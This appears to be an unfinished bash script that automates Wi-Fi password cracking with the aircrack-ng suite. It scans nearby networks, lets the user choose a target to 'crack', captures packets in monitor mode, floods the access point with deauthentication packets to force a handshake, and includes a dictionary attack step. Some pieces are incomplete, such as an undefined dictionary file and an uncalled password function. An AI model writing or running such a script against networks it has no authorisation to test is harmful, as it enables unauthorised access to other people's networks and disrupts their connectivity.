#starts airmon-ng
#find target and afterwards get a target

declare -a mac=()
declare -a essid=()
declare -a channel=()
declare -a interfaces=()

#doing nmap for OS  - to get type of the router
#Like a ZyXEL router has a specific set of passwords
#using airmon-ng instead
scan(){

	while read line; do

		if [[ "$line" =~ Cell || "$line" == "" ]] && [[ "$network" ]]; then
	    # Update arrays & clear
	    mac+=($m)
	    essid+=($e)
	    channel+=($chn)
            network=""
        fi
			
        if [[ "$line" =~ Address ]]; then
            m=${line##*ss: }
            echo "$line"
		elif [[ "$line" =~ Channel ]]; then
            chn=${line##*nel }
            chn=${chn%?}
        elif [[ "$line" =~ ESSID ]]; then
            e=${line##*ID:}
            network="finished reading"
        fi

	done < <(iwlist wlan0 scanning)
}

show(){
	echo "------------------------------------------------------------------"
	for i in "${!mac[@]}"; do
		echo "[$i] ${mac[$i]} ${essid[$i]} ${channel[$i]}"
	done
}
choose_target() {
    echo "--------------------------------------------------------"
    echo "Type the number of the wifi to crack"
    read i; echo "[$i] ${mac[$i]} ${essid[$i]} ${channel[$i]}"
    crack $i
}

crack(){
	capture
	#here need a new window
	jam $1
}

get_password(){
    #create a dictionary file
    file_name+=-01.cap
    aircrack-ng $file_name -w $dictionary_file
}
jam(){
	airodump-ng -c ${channel[$1]} --bssid ${mac[$1]} $interface &
    SCANING=$!

    sleep 5
    kill $SCANING
    sleep 2
    
    aireplay-ng -0 0 -a ${mac[$1]} $interface &

    SCANING=$!
    sleep 5
    kill $SCANING
    sleep 2
}

capture(){
	# Start jamming
    
    while read line; do
        if [[ $line =~ wlan([0-9]+) ]]; then
            w=${BASH_REMATCH[1]}
            interfaces+=('wlan'$w)
        fi
    done < <(airmon-ng)

    PS3='Please enter your choice of interface: '
    select opt in "${interfaces[@]}"
    do
        interface=$opt
        break
    done
    
    airmon-ng start $interface
    interface+=mon
    sleep 5

    echo 'Please type file name used to store the captured packets: '
    read file_name;
    airodump-ng $interface --write $file_name
}
scan
show